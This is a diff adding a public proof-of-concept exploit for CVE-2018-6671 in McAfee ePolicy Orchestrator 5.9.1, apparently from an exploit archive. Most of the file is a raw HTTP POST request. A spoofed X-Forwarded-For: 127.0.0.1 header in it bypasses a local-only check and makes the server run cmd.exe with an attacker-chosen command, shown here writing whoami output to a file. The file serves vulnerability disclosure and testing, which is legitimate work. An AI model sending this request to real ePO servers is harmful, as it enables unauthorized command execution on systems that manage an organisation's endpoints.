@@ -1,0 +1,45 @@
+# Exploit Title: McAfee ePO 5.9.1 Registered Executable Local Access Bypass
+# Date: 2019-03-07
+# Exploit Author: @leonjza
+# Vendor Homepage: https://www.mcafee.com/
+# Software Link: https://www.mcafee.com/enterprise/en-us/products/epolicy-orchestrator.html
+# Version: ePO v5.9.1
+# Tested on: Windows Server 2012
+# CVE : cve-2018-6671
+
+GIST LINK: https://gist.github.com/leonjza/17eb8ed9cba0ea1d2c70b82782c6d949
+
+# CVE-2018-6671 McAfee ePO 5.9.1 Registered Executable Local Access Bypass
+# Specifying an X-Forwarded-For header bypasses the local only check
+# https://kc.mcafee.com/corporate/index?page=content&id=SB10240
+# https://nvd.nist.gov/vuln/detail/CVE-2018-6671
+#
+# 2019 @leonjza
+#
+# Tested on ePO v5.9.1, missing hotfix EPO5xHF1229850
+
+POST /Notifications/testRegExe.do HTTP/1.1
+Host: 192.168.1.26:8443
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0)
+Gecko/20100101 Firefox/66.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://192.168.1.26:8443/Notifications/addRegExecutable.do?orion.user.security.token=Bp5pZJOQll2vryhC
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 284
+DNT: 1
+Connection: close
+Cookie: JSESSIONID=645BCB1CE5B7DBE1B9EDC7BB9F2F7349.route1;
+orion.login.language="language:en&country:";
+orion.content.size="width:1384&height:699";
+JSESSIONIDSSO=4D970A5F2DBF48309F796DF38B80FC15
+X-Forwarded-For: 127.0.0.1
+
+orion.user.security.token=Bp5pZJOQll2vryhC&orion.user.security.token=Bp5pZJOQll2vryhC&executableName=CVE-2018-6671%20PoC&executablePath=c:\windows\system32\cmd.exe&userName=&pass=&passConfirm=&testExeArgs=/c
+whoami > c:\CVE-2018-6671.txt&testExeTime=60000&objectId=0&ajaxMode=standard
+
+
+-- 
+L.
+:wq!
